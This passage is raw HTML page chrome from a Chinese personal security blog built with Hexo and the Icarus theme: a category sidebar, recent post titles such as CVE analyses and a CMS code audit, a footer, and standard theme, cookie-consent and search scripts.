is-hidden-desktop-only order-3"><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">做题记录</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">学习记录</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Docker/"><span class="level-start"><span class="level-item">Docker</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"><span class="level-start"><span class="level-item">渗透工具</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">笔记</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%87%AA%E5%BB%BA%E9%9D%B6%E5%9C%BA/"><span class="level-start"><span class="level-item">自建靶场</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"><span class="level-start"><span class="level-item">常见漏洞</span></span><span class="level-end"><span class="level-item tag">7</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/"><span class="level-start"><span class="level-item">Web漏洞</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-07T04:46:48.000Z">2024-01-07</time></p><p class="title"><a href="/2024/01/07/Vim%E5%AD%A6%E4%B9%A0/">Vim学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-01T08:06:34.000Z">2024-01-01</time></p><p class="title"><a href="/2024/01/01/16-PHP-Magic-Methods/">16_PHP_Magic_Methods</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-29T18:46:17.000Z">2023-12-30</time></p><p class="title"><a href="/2023/12/30/CVE-2023-47130%E5%88%86%E6%9E%90/">CVE-2023-47130分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-29T18:19:30.000Z">2023-12-30</time></p><p class="title"><a href="/2023/12/30/CVE-2023-41892%E5%88%86%E6%9E%90/">CVE-2023-41892分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-23T13:38:37.000Z">2023-12-23</time></p><p class="title"><a href="/2023/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">记一次CMS代码审计</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/icon.jpg" alt="Potat0w0" height="28"></a><p class="is-size-7"><span>&copy; 2024 Potat0w0</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">©❤POTATO</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
